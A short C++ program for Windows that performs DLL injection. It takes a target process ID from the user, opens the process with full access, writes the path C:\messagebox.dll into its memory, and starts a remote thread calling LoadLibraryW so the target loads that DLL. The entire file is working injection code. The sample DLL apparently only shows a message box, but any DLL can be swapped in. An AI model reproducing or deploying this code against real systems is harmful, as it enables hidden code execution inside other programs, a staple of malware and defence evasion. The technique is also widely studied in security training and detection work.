#include <Windows.h>
#include <iostream>

using namespace std;

int main() {
    
	cout << "DLL Injection " << endl;
	wchar_t dllPath[] = L"C:\\messagebox.dll";

	// Get The Process ID value from the user
	int pId;
	cout << "[+] Enter Target PID : ";
	cin >> pId;
    cout << endl;

	// Open Process Handle to the target process
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pId );
	
	// Allocating Memory in the target process
    LPVOID pLocation = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

    // Writing DLLPath into the allocated memory
    BOOL boolWriteMemory = WriteProcessMemory(hProcess, pLocation, &dllPath, sizeof(dllPath), NULL);


    // Creating New thread to run the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW"), pLocation, 0, NULL );
    cout << "[+] Injected!" << endl;

	return 0;
}